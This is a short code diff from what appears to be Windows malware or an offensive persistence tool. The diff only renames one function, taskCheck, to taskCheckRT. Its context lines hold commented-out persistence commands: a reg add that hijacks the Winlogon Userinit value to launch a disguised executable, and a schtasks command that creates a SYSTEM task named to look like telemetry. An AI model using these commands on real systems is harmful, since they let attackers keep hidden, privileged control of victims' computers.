@@ -56,7 +56,7 @@ void registryPersist2() {
 	// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\System32\wbem\Duplicity.exe" /f
 }
 
-void taskCheck() {
+void taskCheckRT() {
 	//schtasks /create /tn "WinTelemetryRecovery" /tr "C:\Windows\System32\wbem\YourTelemetry.exe" /sc ONEVENT /EC Application /MO "*[System[Provider[@Name='Application Error'] and EventID=1000]]" /ru "NT AUTHORITY\SYSTEM"
 }
 
@@ -66,5 +66,5 @@ void goAwayRT() {
 	daclProcess();
 	registryPersist1();
 	registryPersist2();
-	taskCheck();
+	taskCheckRT();
 }
